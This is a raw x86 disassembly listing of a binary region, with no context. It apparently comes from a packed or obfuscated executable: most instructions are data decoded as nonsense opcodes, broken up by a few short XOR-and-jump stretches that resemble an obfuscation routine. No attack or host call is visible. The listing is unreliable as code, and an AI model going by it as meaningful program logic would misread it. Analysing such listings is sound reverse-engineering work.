  40df1d:	repz mov ecx,DWORD PTR [ebx+edx*2]
  40df21:	je     0x40df42
  40df23:	loop   0x40def2
  40df25:	inc    esi
  40df26:	jmp    DWORD PTR [ebx]
  40df28:	sbb    al,0x6
  40df2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df2b:	sub    bh,bh
  40df2d:	rcl    BYTE PTR [ebx+0x26],cl
  40df30:	push   cs
  40df31:	in     al,dx
  40df32:	imul   esi,DWORD PTR [eax-0x6d],0x2a
  40df36:	fild   DWORD PTR [eax-0x7a]
  40df39:	les    esp,FWORD PTR [edx-0x44fc2100]
  40df3f:	adc    ch,dl
  40df41:	mov    cl,0xdc
  40df43:	sub    eax,0x17cc05fa
  40df48:	mov    edx,0x1fa896d2
  40df4e:	bound  ebp,QWORD PTR [ebx]
  40df50:	pop    eax
  40df51:	lahf   
  40df52:	jb     0x40df02
  40df54:	dec    edi
  40df55:	add    dh,ah
  40df57:	jo     0x40df65
  40df59:	xlat   BYTE PTR ds:[ebx]
  40df5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5b:	dec    edi
  40df5c:	mov    cs:0xbd1ffd78,al
  40df62:	jge    0x40dfde
  40df64:	adc    al,0x2f
  40df66:	nop
  40df67:	aam    0xb1
  40df69:	xor    eax,ecx
  40df6b:	mov    esi,0xea8e7191
  40df70:	lods   al,BYTE PTR ds:[si]
  40df72:	iret   
  40df73:	sti    
  40df74:	pop    ss
  40df75:	or     edx,DWORD PTR [ebx-0x18]
  40df78:	les    edx,FWORD PTR [edi+0x7b]
  40df7b:	jp     0x40df22
  40df7d:	cs sub ecx,ecx
  40df80:	lahf   
  40df81:	or     edx,eax
  40df83:	stos   BYTE PTR es:[edi],al
  40df84:	mov    ds:0x306c14a2,eax
  40df89:	sahf   
  40df8a:	aaa    
  40df8b:	and    eax,0xf012c6f5
  40df90:	retf   0xf5c8
  40df93:	mov    ebp,0x8173a8a5
  40df98:	lds    edx,FWORD PTR [ebp+ebx*2+0x54]
  40df9c:	mov    edi,0x7fd140f4
  40dfa1:	dec    esp
  40dfa2:	jb     0x40dfbd
  40dfa4:	arpl   WORD PTR [edx],sp
  40dfa6:	or     BYTE PTR [ebx-0x2dcc4bab],0xc1
  40dfad:	loopne 0x40dfcd
  40dfaf:	mov    ax,dx
  40dfb2:	or     ax,cx
  40dfb5:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfb8:	cmp    WORD PTR [ecx],ax
  40dfbb:	je     0x40eb64
  40dfc1:	mov    eax,DWORD PTR [ebp+0x14]
  40dfc4:	sub    DWORD PTR [ebp-0x4],eax
  40dfc7:	mov    eax,DWORD PTR [esi]
  40dfc9:	mov    ecx,DWORD PTR [esi+0x4]
  40dfcc:	mov    ecx,eax
  40dfce:	jmp    0x40e558
  40dfd3:	push   ebx
  40dfd4:	cli    
  40dfd5:	test   dh,ah
  40dfd7:	fs pop eax
  40dfd9:	pop    ecx
  40dfda:	jb     0x40df93
  40dfdc:	shr    DWORD PTR [esi+ebp*4-0x4d7d19c0],1
  40dfe3:	sub    ch,BYTE PTR [eax+0x43d1616]
  40dfe9:	push   ss
  40dfea:	push   ss
  40dfeb:	mov    cl,0x14
  40dfed:	push   ds
  40dfee:	out    0xae,eax
  40dff0:	bnd jg 0x40e025
  40dff3:	lods   eax,DWORD PTR ds:[esi]
  40dff4:	sbb    eax,0x4d67d84e
  40dff9:	or     edx,ebp
  40dffb:	mov    eax,ds:0x8f25a6ea
  40e000:	push   cs
  40e001:	rol    DWORD PTR [edi+0x6d734fd0],1
  40e007:	test   eax,0x98152a85
  40e00c:	(bad)  
  40e00d:	xchg   edx,eax
  40e00e:	push   ecx
  40e00f:	sub    DWORD PTR [edx+0x14],esp
  40e012:	xor    al,0x92
  40e014:	sahf   
  40e015:	clc    
  40e016:	push   cs
  40e017:	jp     0x40dffb
  40e019:	repnz not DWORD PTR [ebx-0x729ab523]
  40e020:	sub    ah,bh
  40e022:	and    eax,0xd428c4a9
  40e027:	mov    ebx,DWORD PTR [edi-0x2c420759]
  40e02d:	xchg   esp,eax
  40e02e:	sub    DWORD PTR [edi-0x4c12cdf6],0x45
  40e035:	loopne 0x40e05c
  40e037:	mov    al,0xcc
  40e039:	out    0x4f,eax
  40e03b:	and    al,0xf2
  40e03d:	or     BYTE PTR [ecx+0x3cb71d46],0xfe
  40e044:	mov    WORD PTR [ecx+ebx*2-0x705a318e],gs
  40e04b:	adc    cl,ch
  40e04d:	mov    al,0xd
  40e04f:	jg     0x40e0b1
  40e051:	mov    ecx,0xfebf4790
  40e056:	not    DWORD PTR fs:[ebp+0x67]
  40e05a:	mov    ebx,0x18797393
  40e05f:	pusha  
  40e060:	lock jle 0x40e0a2
  40e063:	mov    dl,0x5f
  40e065:	out    0x49,al
  40e067:	outs   dx,BYTE PTR ds:[esi]
  40e068:	enter  0x4293,0xa6
  40e06c:	rdpmc  
  40e06e:	rcl    DWORD PTR [ecx-0x74],cl
  40e071:	lods   al,BYTE PTR ds:[esi]
  40e072:	adc    eax,0xc788b4da
  40e077:	arpl   WORD PTR [ebx],dx
  40e079:	mov    ecx,DWORD PTR [edx-0x7467316c]
  40e07f:	loop   0x40e082
  40e081:	mov    esi,0x165c3313
  40e086:	sbb    esi,DWORD PTR [ecx-0x75185898]
  40e08c:	enter  0x2219,0x49
  40e090:	call   0xfe1b:0xd8fe06d1
  40e097:	mov    esi,DWORD PTR ds:0x2f39c94b
  40e09d:	mov    dh,0xd8
  40e09f:	arpl   WORD PTR [esi+ebp*1],bx
  40e0a2:	adc    eax,DWORD PTR [ebp-0x24]
  40e0a5:	push   0xd588d644
  40e0aa:	aas    
  40e0ab:	cmp    bh,ah
  40e0ad:	push   es
  40e0ae:	lods   al,BYTE PTR ds:[esi]
  40e0af:	loop   0x40e0fc
  40e0b1:	loopne 0x40e0ff
  40e0b3:	into   
  40e0b4:	mov    edi,0x42c27262
  40e0b9:	cli    
  40e0ba:	cmp    BYTE PTR [edx],ch
  40e0bc:	push   ebp
  40e0bd:	cmp    ah,dh
  40e0bf:	arpl   si,cx
  40e0c1:	pop    ecx
  40e0c2:	inc    edi
  40e0c3:	js     0x40e0f0
  40e0c5:	push   ebx
  40e0c6:	pop    eax
  40e0c7:	pop    ebx
  40e0c8:	jge    0x40e0eb
  40e0ca:	js     0x40e0f5
  40e0cc:	(bad)  
  40e0cd:	ret    
  40e0ce:	mov    edx,0xd5ac254f
  40e0d3:	cmp    edi,DWORD PTR [esi]
  40e0d5:	jecxz  0x40e061
  40e0d7:	add    DWORD PTR [edi-0x4bea5e93],0x9
  40e0de:	push   cs
  40e0df:	jns    0x40e14a
  40e0e1:	jo     0x40e063
  40e0e3:	inc    esi
  40e0e4:	aam    0x44
  40e0e6:	sub    al,0x39
  40e0e8:	push   esp
  40e0e9:	sbb    DWORD PTR [edx-0x3e6c1723],eax
  40e0ef:	leave  
  40e0f0:	sub    DWORD PTR [edx-0x44e89a4d],eax
  40e0f6:	sbb    BYTE PTR [ebx-0x5],dh
  40e0f9:	daa    
  40e0fa:	mov    esp,0xf2684e9c
  40e0ff:	scas   eax,DWORD PTR es:[edi]
  40e100:	inc    ebx
  40e101:	dec    edx
  40e102:	popa   
  40e103:	mov    edx,0x8157dc62
  40e108:	adc    BYTE PTR [eax],0xfd
  40e10b:	jge    0x40e0a8
  40e10d:	push   ebx
  40e10e:	mov    al,ds:0xd491871d
  40e113:	jp     0x40e14a
  40e115:	cli    
  40e116:	repz pop es
  40e118:	pushf  
  40e119:	call   0x3420011a
  40e11e:	and    edi,DWORD PTR [ecx+0x27]
  40e121:	adc    eax,0x51aa0b27
  40e126:	jg     0x40e115
  40e128:	pushf  
  40e129:	rcr    DWORD PTR [ebx-0x61d85ddc],0xe8
  40e130:	inc    edi
  40e131:	rcl    BYTE PTR [eax],cl
  40e133:	icebp  
  40e134:	jge    0x40e188
  40e136:	add    edx,DWORD PTR [edx-0x6b]
  40e139:	or     eax,0x8ee37ed9
  40e13e:	js     0x40e18d
  40e140:	or     BYTE PTR [esi-0x58],bh
  40e143:	mov    ch,0x2e
  40e145:	out    0xc0,eax
  40e147:	popa   
  40e148:	cli    
  40e149:	dec    edi
  40e14a:	test   BYTE PTR [ebp+0x2e],ah
  40e14d:	add    eax,0xd7c564c4
  40e152:	call   0xe5eb39d7
  40e157:	mov    esi,0x5005efc9
  40e15c:	xchg   esi,edx
  40e15e:	rcl    BYTE PTR [eax-0x6cecc0b1],cl
  40e164:	pusha  
  40e165:	jns    0x40e192
  40e167:	xor    edx,DWORD PTR [edi+esi*2-0x62]
  40e16b:	push   esi
  40e16c:	lods   al,BYTE PTR ds:[esi]
  40e16d:	(bad)  
  40e16e:	pop    eax
  40e16f:	cmp    DWORD PTR [edx-0xcc2117b],edi
  40e175:	push   esp
  40e176:	pop    esi
  40e177:	loop   0x40e110
  40e179:	xor    eax,0xab8d93cc
  40e17e:	ror    DWORD PTR [ecx+0x40418a33],0xd0
  40e185:	pop    ecx
  40e186:	cmp    al,0xd2
  40e188:	mov    eax,ds:0x452a7c34
  40e18d:	dec    edi
  40e18e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e18f:	sub    cl,BYTE PTR [esi]
  40e191:	jne    0x40e1fb
  40e193:	popa   
  40e194:	cmp    al,0x67
  40e196:	pop    eax
  40e197:	ins    BYTE PTR es:[edi],dx
  40e198:	mov    dl,0x32
  40e19a:	(bad)  
  40e19b:	cwde   
  40e19c:	jecxz  0x40e1c2
  40e19e:	pop    ebx
  40e19f:	(bad)  
  40e1a0:	retf   
  40e1a1:	mov    esi,0x6dec685a
  40e1a6:	inc    ebp
  40e1a7:	jg     0x40e205
  40e1a9:	cwde   
  40e1aa:	jmp    0xdd56:0xe88805f2
  40e1b1:	adc    DWORD PTR [eax-0x6c14d009],0xfffffff2
  40e1b8:	test   BYTE PTR [edi],bh
  40e1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1bb:	xchg   esp,eax
  40e1bc:	xchg   esp,eax
  40e1bd:	test   DWORD PTR [ecx],ebp
  40e1bf:	scas   al,BYTE PTR es:[edi]
  40e1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c1:	repz scas eax,DWORD PTR es:[edi]
  40e1c3:	and    bh,bh
  40e1c5:	aas    
  40e1c6:	dec    esp
  40e1c7:	in     eax,dx
  40e1c8:	jge    0x40e1c0
  40e1ca:	imul   ebx,DWORD PTR [ecx-0x5bea5ca7],0x2d39b85d
  40e1d4:	rcr    BYTE PTR [ebp-0x1eb5069],cl
  40e1da:	(bad)  
  40e1db:	psraw  mm2,QWORD PTR [ecx-0xf2f2b72]
  40e1e2:	pusha  
  40e1e3:	mov    ebx,0xf821539c
  40e1e8:	push   ebp
  40e1e9:	dec    edx
  40e1ea:	xchg   esi,eax
  40e1eb:	inc    BYTE PTR [ebp+0x6a]
  40e1ee:	add    edx,0x2f394d5f
  40e1f4:	scas   eax,DWORD PTR es:[edi]
  40e1f5:	adc    eax,DWORD PTR [ebp+0x1f]
  40e1f8:	(bad)
  40e1fb:	inc    ecx
  40e1fc:	push   ds
  40e1fd:	test   eax,0x6658a404
  40e202:	xchg   ecx,eax
  40e203:	add    BYTE PTR [ebx-0x73c39480],0x70
  40e20a:	mov    es,WORD PTR [eax]
  40e20c:	and    BYTE PTR [esi+0x1f],0x9
  40e210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e211:	in     al,dx
  40e212:	stc    
  40e213:	ss jb  0x40e1fe
  40e216:	jb     0x40e264
  40e218:	dec    esp
  40e219:	daa    
  40e21a:	sbb    ah,BYTE PTR [ecx-0x6f]
  40e21d:	stos   DWORD PTR es:[edi],eax
  40e21e:	cld    
  40e21f:	or     BYTE PTR [edi-0x5dc89f1c],cl
  40e225:	xchg   edi,eax
  40e226:	popf   
  40e227:	int    0xb4
  40e229:	adc    eax,esp
  40e22b:	ret    0xcd71
  40e22e:	leave  
  40e22f:	or     cl,BYTE PTR [esi]
  40e231:	rcl    ebx,0xa7
  40e234:	sub    cl,dh
  40e236:	and    esi,DWORD PTR [eax-0x6be22a54]
  40e23c:	lahf   
  40e23d:	inc    edi
  40e23e:	pop    ss
  40e23f:	sbb    esi,DWORD PTR ds:0x927ebbd1
  40e245:	fadd   DWORD PTR [ebp-0x48]
  40e248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e249:	sub    DWORD PTR [edx-0x509a6818],0x78
  40e250:	mov    bh,0x3
  40e252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e253:	jge    0x40e1ee
  40e255:	jp     0x40e22b
  40e257:	loope  0x40e294
  40e259:	pop    edx
  40e25a:	or     cl,BYTE PTR [ebx+0x1a]
  40e25d:	scas   eax,DWORD PTR es:[edi]
  40e25e:	sub    eax,0x29b23971
  40e263:	shr    BYTE PTR [edi-0x4c034f2e],1
  40e269:	xor    dl,cl
  40e26b:	addr16 jmp 0x40e299
  40e26e:	xchg   esi,eax
  40e26f:	push   0xffffffab
  40e271:	imul   ebx,DWORD PTR [eax-0x1fc2ae88],0x7380e01f
  40e27b:	push   ecx
  40e27c:	retf   
  40e27d:	call   0x7764822e
  40e282:	and    ebp,DWORD PTR [ebx-0x5f]
  40e285:	xor    eax,0x14c7b2fd
  40e28a:	cmc    
  40e28b:	scas   al,BYTE PTR es:[edi]
  40e28c:	dec    ecx
  40e28d:	push   ebp
  40e28e:	mov    edi,0x8963615d
  40e293:	arpl   WORD PTR [edx-0x2f20e4c],sp
  40e299:	test   al,0x97
  40e29b:	pop    ebp
  40e29c:	jns    0x40e315
  40e29e:	outs   dx,BYTE PTR ds:[esi]
  40e29f:	fs mov esi,0xc034f8e9
  40e2a5:	scas   eax,DWORD PTR es:[edi]
  40e2a6:	inc    eax
  40e2a7:	adc    BYTE PTR [ebx],0x52
  40e2aa:	mov    dl,0x2d
  40e2ac:	mov    edx,0x43c25cf6
  40e2b1:	xchg   edx,eax
  40e2b2:	sub    BYTE PTR [ebx-0x17],bl
  40e2b5:	dec    esp
  40e2b6:	pop    es
  40e2b7:	cmc    
  40e2b8:	repz sar bh,1
  40e2bb:	test   eax,0x3b372940
  40e2c0:	jle    0x40e29a
  40e2c2:	dec    ebp
  40e2c3:	xlat   BYTE PTR ds:[ebx]
  40e2c4:	hlt    
  40e2c5:	fisub  DWORD PTR [esi-0x9]
  40e2c8:	fiadd  DWORD PTR [eax-0x5f]
  40e2cb:	jo     0x40e325
  40e2cd:	sub    edx,DWORD PTR [eax-0x4c]
  40e2d0:	cdq    
  40e2d1:	cmp    eax,0xab131cb7
  40e2d6:	test   eax,0x9313a11d
  40e2db:	jns    0x40e2f1
  40e2dd:	lahf   
  40e2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2df:	iret   
  40e2e0:	outs   dx,WORD PTR ds:[esi]
  40e2e2:	xchg   esi,eax
  40e2e3:	fs dec eax
  40e2e5:	or     eax,0x4272485f
  40e2ea:	push   es
  40e2eb:	push   ebp
  40e2ec:	imul   edi,DWORD PTR [ebx],0xa69d9258
  40e2f2:	into   
  40e2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f4:	mov    BYTE PTR [ecx],dl
  40e2f6:	inc    ebx
  40e2f7:	mov    esp,0xc822c2d1
  40e2fc:	push   DWORD PTR [eax+ebp*4-0x24]
  40e300:	sbb    eax,0x1f7d88d9
  40e305:	xchg   ebp,eax
  40e306:	repz cmp DWORD PTR fs:[ebx],edx
  40e30a:	hlt    
  40e30b:	sbb    al,0xe3
  40e30d:	ins    BYTE PTR es:[edi],dx
  40e30e:	mov    edx,cs
  40e310:	jo     0x40e33c
  40e312:	es xchg esi,eax
  40e314:	mov    ah,0xda
  40e316:	je     0x40e2d6
  40e318:	call   0x957c:0x2dbc39d1
  40e31f:	add    ebx,DWORD PTR [esi-0x3aab4562]
  40e325:	jmp    0x40e343
  40e327:	dec    edx
  40e328:	nop    edi
  40e32b:	cmp    DWORD PTR [eax+0x7c],edx
  40e32e:	add    ebx,DWORD PTR [eax]
  40e330:	scas   eax,DWORD PTR es:[edi]
  40e331:	sub    esp,DWORD PTR [esi+0x1b]
  40e334:	jecxz  0x40e39e
  40e336:	jno    0x40e2e6
  40e338:	xor    BYTE PTR [ecx-0x48],0x64
  40e33c:	rcl    BYTE PTR [eax],1
  40e33e:	cld    
  40e33f:	aas    
  40e340:	repnz daa 
  40e342:	outs   dx,BYTE PTR ds:[esi]
  40e343:	dec    edx
  40e344:	stos   DWORD PTR es:[edi],eax
  40e345:	cld    
  40e346:	jecxz  0x40e38d
  40e348:	inc    ebp
  40e349:	out    0x6e,al
  40e34b:	and    BYTE PTR [edx+0x24],cl
  40e34e:	loopne 0x40e328
  40e350:	and    al,0x91
  40e352:	out    dx,eax
  40e353:	cmp    cl,BYTE PTR [ebx+0x23818f48]
  40e359:	adc    ah,dh
  40e35b:	aam    0xfd
  40e35d:	mov    ebx,0x387c1555
  40e362:	mov    ds:0xcd0198ac,al
  40e367:	jge    0x40e30d
  40e369:	pop    edi
  40e36a:	or     BYTE PTR [esi+0x430ee8ee],bl
  40e370:	into   
  40e371:	sub    edx,0x29
  40e374:	fstp   QWORD PTR [eax+0x17d14372]
  40e37a:	rcr    DWORD PTR [edx-0x156af8d],1
  40e380:	fcmovnbe st,st(2)
  40e382:	dec    esi
  40e383:	push   eax
  40e384:	xchg   BYTE PTR ds:0x20e1d524,ah
  40e38a:	xchg   BYTE PTR [ebp-0x15cf346a],al
  40e390:	xchg   ecx,eax
  40e391:	dec    ebp
  40e392:	adc    al,0x20
  40e394:	lock shl BYTE PTR [ebx],cl
  40e397:	gs pop eax
  40e399:	mov    BYTE PTR [edi+0x33],dh
  40e39c:	jl     0x40e3b2
  40e39e:	in     eax,dx
  40e39f:	in     al,dx
  40e3a0:	ins    BYTE PTR es:[edi],dx
  40e3a1:	inc    ebx
  40e3a2:	retf   0x71db
  40e3a5:	mov    al,ds:0xcfdecccb
  40e3aa:	fistp  DWORD PTR [ebx+ebp*2+0x4e457fab]
  40e3b1:	xor    edx,esp
  40e3b3:	lods   al,BYTE PTR ds:[esi]
  40e3b4:	fisubr DWORD PTR [edi]
  40e3b6:	and    cl,0x3c
  40e3b9:	jecxz  0x40e37b
  40e3bb:	cmp    BYTE PTR [ebx+0x1ee6f1cf],dh
  40e3c1:	fmul   st,st(0)
  40e3c3:	sar    BYTE PTR [edx+0x38],0x50
  40e3c7:	sbb    ebp,eax
  40e3c9:	or     DWORD PTR es:[eax+ebp*8],0x1b2b5302
  40e3d1:	and    al,0x63
  40e3d3:	mov    WORD PTR [eax-0x3b5cca69],ss
  40e3d9:	clc    
  40e3da:	mov    ebp,0x5652164e
  40e3df:	ins    BYTE PTR es:[edi],dx
  40e3e0:	push   ebp
  40e3e1:	pop    ebp
  40e3e2:	inc    esp
  40e3e3:	es out dx,al
  40e3e5:	cmp    BYTE PTR [esi+0x2c05d600],cl
  40e3eb:	aas    
  40e3ec:	into   
  40e3ed:	stos   DWORD PTR es:[edi],eax
  40e3ee:	ret    0x8d64
  40e3f1:	push   cs
  40e3f2:	lods   eax,DWORD PTR ds:[esi]
  40e3f3:	pop    edx
  40e3f4:	mov    cl,BYTE PTR [esi+0x28b8bf6a]
  40e3fa:	dec    ecx
  40e3fb:	and    ch,cl
  40e3fd:	cmp    al,0xde
  40e3ff:	push   esp
  40e400:	stc    
  40e401:	push   ds
  40e402:	std    
  40e403:	jne    0x40e424
  40e405:	and    BYTE PTR [edx],cl
  40e407:	jbe    0x40e461
  40e409:	xor    bl,bl
  40e40b:	mov    al,ds:0xd99ad440
  40e410:	mov    ds,WORD PTR [eax]
  40e412:	fadd   st(4),st
  40e414:	sub    DWORD PTR [ecx],ebp
  40e416:	fcom   QWORD PTR [ebx]
  40e418:	adc    al,BYTE PTR [ecx]
  40e41a:	jg     0x40e420
  40e41c:	(bad)  
  40e41d:	scas   eax,DWORD PTR es:[edi]
  40e41e:	rcr    DWORD PTR [edx+0x28ffb82c],1
  40e424:	jmp    0x7fac:0xd54a701f
  40e42b:	or     eax,0x4b3183ba
  40e430:	scas   al,BYTE PTR es:[edi]
  40e431:	shl    ch,cl
  40e433:	imul   esi,DWORD PTR [edx-0xa6c3608],0xab8e28b6
  40e43d:	jge    0x40e3dc
  40e43f:	je     0x40e496
  40e441:	jbe    0x40e40c
  40e443:	mov    ds:0xf8557618,eax
  40e448:	cmc    
  40e449:	adc    BYTE PTR [eax],0x5a
  40e44c:	add    eax,0xaf3c49f6
  40e451:	mov    edx,0xf4aca3a
  40e456:	ss jns 0x40e413
  40e459:	nop
  40e45a:	push   0x8c60f8f0
  40e45f:	lods   eax,DWORD PTR ds:[esi]
  40e460:	retf   
  40e461:	xchg   edi,eax
  40e462:	retf   0xb7b7
  40e465:	aaa    
  40e466:	or     al,0x7e
  40e468:	leave  
  40e469:	inc    edi
  40e46a:	or     DWORD PTR [eax+0x3d],0x9a0f51ae
  40e471:	enter  0x955,0x5f
  40e475:	iret   
  40e476:	call   0x39109b0c
  40e47b:	push   ds
  40e47c:	jecxz  0x40e4eb
  40e47e:	jg     0x40e431
  40e480:	xor    eax,0x456d5e82
  40e485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e487:	int3   
  40e488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e489:	imul   DWORD PTR [edx+edx*2-0x4dd0aebd]
  40e490:	dec    edi
  40e491:	or     ebx,0xffffffc7
  40e494:	shl    DWORD PTR [ebx-0x6b005431],1
  40e49a:	cdq    
  40e49b:	nop
  40e49c:	aas    
  40e49d:	cs (bad) 
  40e49f:	xchg   edi,eax
  40e4a0:	adc    DWORD PTR [ebx+0x1750be68],edi
  40e4a6:	lods   al,BYTE PTR ds:[esi]
  40e4a7:	nop
  40e4a8:	inc    edi
  40e4a9:	adc    BYTE PTR [esi+0x63],dh
  40e4ac:	jle    0x40e4f9
  40e4ae:	adc    ecx,DWORD PTR [ebp+ebp*2-0x3c]
  40e4b2:	add    edx,DWORD PTR [ecx]
  40e4b4:	rol    DWORD PTR [ebx+eax*4+0x3a548560],0x39
  40e4bc:	mov    cl,0x36
  40e4be:	lock rcr al,cl
  40e4c1:	retf   
  40e4c2:	or     dl,BYTE PTR [ecx-0x2eea934f]
  40e4c8:	test   eax,0x3a809003
  40e4cd:	cmc    
  40e4ce:	test   DWORD PTR [edi+0x240d3154],ecx
  40e4d4:	sbb    DWORD PTR [ecx+ebp*8-0x2c790b1f],ecx
  40e4db:	test   eax,0xde933562
  40e4e0:	ins    DWORD PTR es:[edi],dx
  40e4e1:	jb     0x40e4b1
  40e4e3:	ins    DWORD PTR es:[edi],dx
  40e4e4:	push   ss
  40e4e5:	rcl    BYTE PTR [ecx+0x521e113c],1
  40e4eb:	das    
  40e4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ed:	pop    ecx
  40e4ee:	cwde   
  40e4ef:	sub    DWORD PTR [ecx+ebp*8],0xffffffc9
  40e4f3:	inc    edx
  40e4f4:	data16 mov ds:0x9cff0005,al
  40e4fa:	std    
  40e4fb:	lock sub al,BYTE PTR [esi-0x13112ae6]
  40e502:	push   esi
  40e503:	gs push ebp
  40e505:	mov    ebp,0x1b391a15
  40e50a:	and    esp,ecx
  40e50c:	ror    dh,0x6d
  40e50f:	mov    eax,0xb0f09f80
  40e514:	and    ebx,DWORD PTR [ebx+0xc73fec7]
  40e51a:	push   ebp
  40e51b:	test   al,0x94
  40e51d:	iret   
  40e51e:	or     eax,0x932e19c5
  40e523:	fld    TBYTE PTR [ebx+edx*8-0x6feb84a4]
  40e52a:	rol    cl,1
  40e52c:	cmp    DWORD PTR [esi],eax
  40e52e:	pop    gs
  40e530:	mov    ebx,0xd24d75ec
  40e535:	daa    
  40e536:	mov    es,ecx
  40e538:	imul   ebx,DWORD PTR [ecx+0x74],0x54
  40e53c:	retf   
  40e53d:	cmp    al,0xdd
  40e53f:	retf   0x27b4
  40e542:	cmp    edi,eax
  40e544:	pop    ds
  40e545:	xor    al,0xd6
  40e547:	push   esi
  40e548:	fisub  DWORD PTR [eax]
  40e54a:	test   edx,0xf95659e9
  40e550:	stos   DWORD PTR es:[edi],eax
  40e551:	jbe    0x40e564
  40e553:	jl     0x40e5a9
  40e555:	mov    edx,0xe1c1e64c
  40e55a:	push   ds
  40e55b:	xor    ecx,0xc0000000
  40e561:	mov    DWORD PTR [ebp-0x64],ecx
  40e564:	mov    ecx,DWORD PTR [esi]
  40e566:	mov    edx,DWORD PTR [esi+0x4]
  40e569:	xor    edx,0x9c0a89d8
  40e56f:	xor    ecx,0xba699573
  40e575:	shrd   ecx,edx,0x2
  40e579:	shr    edx,0x2
  40e57c:	or     edx,DWORD PTR [ebp-0x64]
  40e57f:	xor    eax,eax
  40e581:	or     ecx,eax
  40e583:	jmp    0x40eb0d
  40e588:	sahf   
  40e589:	or     ah,al
  40e58b:	jp     0x40e525
  40e58d:	cmp    bl,BYTE PTR [eax]
  40e58f:	sub    DWORD PTR [ebx+0x4a],ebp
  40e592:	mov    WORD PTR [esi-0x69],gs
  40e595:	adc    dl,ah
  40e597:	test   al,0x61
  40e599:	xchg   esp,eax
  40e59a:	push   ss
  40e59b:	push   ss
  40e59c:	cmp    eax,0xd8161604
  40e5a1:	dec    ecx
  40e5a2:	in     eax,dx
  40e5a3:	adc    eax,0xf91e3912
  40e5a8:	shl    ch,cl
  40e5aa:	cdq    
  40e5ab:	mov    ebx,0x37b8be86
  40e5b0:	and    eax,0x3c380c13
  40e5b5:	loope  0x40e5f0
  40e5b7:	lods   al,BYTE PTR ds:[esi]
  40e5b8:	xor    bl,BYTE PTR [ecx-0x512bc1d]
  40e5be:	outs   dx,BYTE PTR ds:[esi]
  40e5bf:	stc    
  40e5c0:	cld    
  40e5c1:	dec    ebx
  40e5c2:	add    DWORD PTR [ebx-0x10def342],ebx
  40e5c8:	cdq    
  40e5c9:	or     eax,0xa6f243e3
  40e5ce:	add    esp,DWORD PTR [ecx+ebp*1-0x2839a9d8]
  40e5d5:	scas   eax,DWORD PTR es:[edi]
  40e5d6:	test   BYTE PTR [eax-0x48],al
  40e5d9:	lahf   
  40e5da:	push   ecx
  40e5db:	sbb    bh,BYTE PTR ds:0xef4fe830
  40e5e1:	jns    0x40e5e7
  40e5e3:	loopne 0x40e5aa
  40e5e5:	in     eax,dx
  40e5e6:	and    al,0x53
  40e5e9:	mov    dh,0x8d
  40e5eb:	es dec eax
  40e5ed:	add    al,BYTE PTR [ecx+0x68]
  40e5f0:	sub    DWORD PTR [esi],ebp
  40e5f2:	adc    DWORD PTR [eax+0x3fe8db6a],ebp
  40e5f8:	mov    edi,0x6826009
  40e5fd:	sbb    ebp,DWORD PTR [esi]
  40e5ff:	test   DWORD PTR ds:[edx+ebp*4+0x6cd15cb7],esp
  40e607:	ror    ebp,1
  40e609:	jns    0x40e62c
  40e60b:	cld    
  40e60c:	mov    ebx,0x6b9da34
  40e611:	fidivr WORD PTR [eax]
  40e613:	fstp   QWORD PTR [esi]
  40e615:	cli    
  40e616:	adc    eax,0xe42a6574
  40e61b:	sub    dl,BYTE PTR [eax]
  40e61d:	nop
  40e61e:	inc    si
  40e620:	sub    DWORD PTR [edi+0x5781f1bd],esp
  40e626:	cmp    BYTE PTR [eax+edi*1-0x24],ah
  40e62a:	mov    eax,ds:0x29f7cf93
  40e62f:	cmc    
  40e630:	call   0x6008:0x8f70f20c
  40e637:	fild   WORD PTR [ebp-0x37]
  40e63a:	dec    esp
  40e63b:	push   ds
  40e63c:	rcl    BYTE PTR [ebx+0x69],cl
  40e63f:	xchg   ebx,eax
  40e640:	popf   
  40e641:	repz imul ebx,DWORD PTR es:[esi],0xce0677ab
  40e649:	pop    esp
  40e64a:	jmp    0x4b03:0xa75ccd33
  40e651:	popa   
  40e652:	or     al,0x74
  40e654:	dec    esi
  40e655:	mov    bl,0x65
  40e657:	mov    bh,0x8e
  40e659:	sahf   
  40e65a:	mov    eax,ds:0x77e79506
  40e65f:	rcl    BYTE PTR [ebx+0x2aac57e7],0xe
  40e666:	fidiv  DWORD PTR [ebp+0xd]
  40e669:	dec    ebp
  40e66a:	sub    DWORD PTR [ebx],edx
  40e66c:	sub    ch,BYTE PTR [esi+0x3160b33a]
  40e672:	out    0x32,eax
  40e674:	xchg   esi,eax
  40e675:	and    eax,0x23f2a993
  40e67a:	imul   ebx,DWORD PTR [edx-0x20],0xffffffe8
  40e67e:	or     eax,0xe933427
  40e683:	push   edx
  40e684:	ja     0x40e61f
  40e686:	push   esi
  40e687:	and    al,0x42
  40e689:	cmp    BYTE PTR [ebx],ch
  40e68b:	iret   
  40e68c:	dec    eax
  40e68d:	jl     0x40e67e
  40e68f:	push   0x37f6e137
  40e694:	inc    eax
  40e695:	mov    WORD PTR [eax+0x2e0e9be9],cs
  40e69b:	or     ebp,ecx
  40e69d:	enter  0x6f7,0xd0
  40e6a1:	cld    
  40e6a2:	mov    WORD PTR [edx-0x2f],es
  40e6a5:	loop   0x40e642
  40e6a7:	repnz xlat BYTE PTR ds:[ebx]
  40e6a9:	or     eax,0x3a59c2f5
  40e6ae:	dec    ebp
  40e6af:	xor    bl,bh
  40e6b1:	inc    ecx
  40e6b2:	mov    ds:0xc1ba35f8,al
  40e6b8:	ja     0x40e703
  40e6ba:	ja     0x40e6ca
  40e6bc:	and    al,BYTE PTR [bx+di+0x7fd5]
  40e6c1:	ins    DWORD PTR es:[edi],dx
  40e6c2:	and    al,0x57
  40e6c4:	push   0x77837b70
